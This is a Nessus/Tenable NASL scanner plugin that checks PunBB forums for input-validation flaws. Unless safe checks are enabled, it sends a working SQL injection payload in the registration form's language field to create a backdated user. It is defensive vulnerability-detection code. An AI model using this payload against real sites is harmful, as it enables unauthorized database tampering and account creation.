#
# (C) Tenable Network Security
#
# 


  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple vulnerabilities. 

Description :

The remote host is running a version of PunBB that fails to properly
sanitize user-input to several scripts thereby enabling an attacker to
launch various SQL injection attacks.  

In addition, the profile.php script enables anyone to call the
change_pass action while specifying the id of an existing user to set
their password to NULL, effectively shutting them out of the system. 

See also : 

http://marc.theaimsgroup.com/?l=bugtraq&m=110927754230666&w=2
http://forums.punbb.org/viewtopic.php?id=6460

Solution : 

Upgrade to PunBB 1.2.2 or later.

Risk factor : 

Medium / CVSS Base Score : 5 
(AV:R/AC:L/Au:NR/C:P/A:N/I:P/B:N)";


if (description) {
  script_id(17224);
  script_version("$Revision: 1.7 $");

  script_cve_id("CVE-2005-0569", "CVE-2005-0570", "CVE-2005-0571");
  script_bugtraq_id(12652);
  if (defined_func("script_xref")) {
    script_xref(name:"OSVDB", value:"14128");
    script_xref(name:"OSVDB", value:"14129");
  }

  name["english"] = "PunBB Input Validation Vulnerabilities";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Detects input validation vulnerabilities in PunBB";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);

  script_dependencie("punBB_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/punBB"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  # If safe_checks are enabled, rely on the version number alone.
  if (safe_checks()) {
    if (
      # Either the version is 1.1.x - 1.2.1 or
      ereg(pattern:"^1\.(1|2$|2\.1([^0-9]|$))", string:ver) ||
      # the version is unknown and report paranoia is Paranoid.
      ("unknown" >< ver && report_paranoia == 2)
    ) {
      security_warning(port);
      exit(0);
    }
  }
  # Otherwise, try to exploit it.
  else {
    # Specify a user / password to register. gettimeofday() serves
    # to avoid conflicts and have a (somewhat) random password.
    now = split(gettimeofday(), sep:".", keep:0);
    user = string("nessus", now[0]);
    pass = now[1];

    # Try to create a new user.
    url = "/register.php?action=register";
    boundary = "bound";
    req = string(
      "POST ",  dir, url, " HTTP/1.1\r\n",
      "Host: ", get_host_name(), "\r\n",
      "Content-Type: multipart/form-data; boundary=", boundary, "\r\n"
      # nb: we'll add the Content-Length header and post data later.
    );
    boundary = string("--", boundary);
    postdata = string(
      boundary, "\r\n", 
      'Content-Disposition: form-data; name="form_sent"', "\r\n",
      "\r\n",
      "1\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_username"', "\r\n",
      "\r\n",
      user, "\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_password1"', "\r\n",
      "\r\n",
      "whatever\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_password2"', "\r\n",
      "\r\n",
      "whatever\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="req_email1"', "\r\n",
      "\r\n",
      user, "@example.com\r\n",

      boundary, "\r\n", 
      'Content-Disposition: form-data; name="language"', "\r\n",
      "\r\n",
      # nb: we're supplying values for language, style, registered, 
      #     registration_ip, and last_visit. A value of 0 for
      #     'registered' implies the user registered in 12/31/1969,
      #     which is the basis for our check below.
      "English','Oxygen',0,'0.0.0.0',0) -- \r\n",

      boundary, "--", "\r\n"
    );
    req = string(
      req,
      "Content-Length: ", strlen(postdata), "\r\n",
      "\r\n",
      postdata
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);           # can't connect

    # Now check the User List for the user we just created.
    req = http_get(
      item:string(dir, "/userlist.php?username=", user, "&show_group=-1&sort_by=username&sort_dir=ASC&search=Submit"), 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if ( res == NULL ) exit(0);

    # If they registered in 1969, there's a problem.
    if (egrep(pattern:'class="tcr">.*1969.*</td>', string:res)) {
      desc["english"] += '\n\nPlugin output :\n\n' + string(
        "**** Nessus has successfully exploited this vulnerability by registering\n",
        "**** the user ", user, " to PunBB on the remote host;\n",
        "**** you may wish to remove it at your convenience.\n"
      );
      security_warning(port:port, data:desc["english"]);
      exit(0);
    }
  }
}
